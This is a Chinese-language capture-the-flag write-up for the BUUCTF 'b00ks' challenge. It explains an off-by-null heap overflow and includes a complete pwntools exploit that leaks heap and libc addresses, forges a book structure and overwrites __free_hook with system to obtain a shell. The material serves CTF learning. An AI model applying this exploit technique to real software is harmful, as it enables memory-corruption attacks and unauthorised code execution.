题目来源：[BUUCTF在线评测](https://buuoj.cn/challenges#asis2016_b00ks)

关于这个知识点我用一个例题来讲解吧，这个知识点和off by one的区别在于，后者可以溢出一个字节，而后者则是溢出的是只能\x00字节。

关于函数的刚开始的结构是如下图
![[Pasted image 20250501172710.png]]
函数的刚开始是存在一个change关于author的name的输入，这里是存在一个溢出\x00
![[Pasted image 20250501172228.png]]


下面的函数如下
![[Pasted image 20250501172303.png]]

我们还可以发现edit函数也是存在溢出\x00字节,和上面的图二的溢出是一样的
![[Pasted image 20250501173002.png]]

下面的是show函数，也就是打印id，name，describption,author。
![[Pasted image 20250501173040.png]]

运行如下
![[Pasted image 20250501173307.png]]

刚开始运行一个create就会创建一个book的struct的，结构体如下：

```c
struct book{

    int id;
    void *name;
    void *description;
    int size;

}
```
![[Pasted image 20250501174633.png]]

观察create的函数创建的结构如下：
![[Pasted image 20250501173959.png]]
都是根据off_202010的地址
创建的结构体的地址会放在bss段
![[Pasted image 20250501173827.png]]


#### 做法一

我们创建三个book，我们发现在bss段的地址可以显示出来下面的三个地址都是book的地址。
![[Pasted image 20250501174824.png]]
我们随便进去一个看看,发现第一个空间放的是book的id，第二个是book_name这个chunk的地址，第三个地址方放的是book_description的chunk的地址，第四个放的是book_description的chunk的大小。
![[Pasted image 20250501175007.png]]

我们现在思路是先申请三个book的空间，利用可以change的函数的off by null来将第一个book的地址 0x000056555b6b4160 覆盖成0x000056555b6b4100，这样我们就跑去0x000056555b6b4100的地址伪造一个book的结构体，我们的结构体第一个地址填入id=1,第二个地址填写book_name=unsortedbin->fd的地址，这样我们就可以将free(2)后将main_arena的地址给打印出来，这样我们就将libc的地址泄露出来了，然后我们将第三个空间的地址填写成第三个book的结构体中的description的地址，这样我们就控制了第三个块的sescrition的空间指向了。

我们需要改成的结构如下：

![[Pasted image 20250501181119.png]]

我们前面的计划的大前提是能泄露出来heap的地址，正好我们可以发现上面关于bss段的地址发现的author填满后的地址就是book结构体存放的地址，也就是说我们需要利用change来泄露book的地址，直接show打印就行。

然后我们需要用libc算出free_hook的地址，我们再用edit(1)去将我们伪造的fake1的description的指针指向的地址改成free_hook的地址，然后这时我们book3的description的地址也改成了free_hook的地址了，我们再edit(3)后将free_hook的指向的内容改成我们想要的one_gadget或者system

这时就大功告成了。

记得修改的时候要保证其他的book的内容正常。

```python
from pwn import*

from LibcSearcher import LibcSearcher
# context.log_level='debug'

context.terminal=['tmux','split','-h']

  

elf=ELF('./b00ks')

file = process('./b00ks')

# file=remote('node5.buuoj.cn',25387)

libc=ELF('./libc-2.23.so')

  

menu='>'

def add(size, content,des_size,des_content):  

    file.sendlineafter(menu, str(1))  

    file.sendlineafter("Enter book name size:", str(size))  

    file.sendlineafter("Enter book name (Max 32 chars):", content)

    file.sendlineafter("Enter book description size:",str(des_size))

    file.sendlineafter("Enter book description: ",des_content)

  

def edit(idx, content):  

    file.sendlineafter(menu, str(3))  

    file.sendlineafter("Enter the book id you want to edit:", str(idx))  

    file.sendlineafter("Enter new book description:", content)  

  

def free(idx):  

    file.sendlineafter(menu, str(2))  

    file.sendlineafter("Enter the book id you want to delete:", str(idx))  

  

def show():  

    file.sendlineafter(menu, str(4))

  

def change():

    file.sendlineafter(menu, str(5))

    file.sendlineafter('Enter author name: ',b'a'*0x20)  

file.recvuntil("Enter author name:")

file.sendline(b'a'*32)

add(0x90,'',0x90,'')

add(0x80,'',0x20,'')

add(0x20,b'/bin/sh\x00',0x20,b'/bin/sh\x00')

show()

gdb.attach(file)

  

file.recvuntil(b'a'*0x20)

book_1 = u64(file.recv(6).ljust(8,b'\x00'))

  

edit(1,b'a'*0x40+p64(1)+p64(book_1+0x30)+p64(book_1+0x190)+p64(0x20))

change()

  

free(2)

show()

file.recvuntil("Name: ")

main_arena_88 = u64(file.recv(6).ljust(8, b'\x00'))

main_arena_addr = main_arena_88 - 88

malloc_hook_addr = main_arena_addr - 0x10

libc_base = malloc_hook_addr - libc.sym['__malloc_hook']

sys_addr = libc_base + libc.sym['system']

one=[0x4527a,0xf03a4,0xf1247]

one_gadget = libc_base + one[2]

  

free_hook = libc_base + libc.sym['__free_hook']

edit(1,p64(free_hook)+p64(0x10))

edit(3,p64(sys_addr))
log.success('free_hook==>'+hex(free_hook))
log.success('one_gadget_addr ==>>:'+hex(one_gadget))
log.success('system_addr ==>>:'+hex(sys_addr))
log.success('malloc_hook_addr ==>>:'+hex(malloc_hook_addr))
log.success('book_1 ==>>:'+hex(book_1))
free(3)

file.interactive()
```


#### 做法二

说是做法二，其实使用另一种mmap泄露libc的方法来做，大致核心流程不变的。

这个等我想做再写吧
。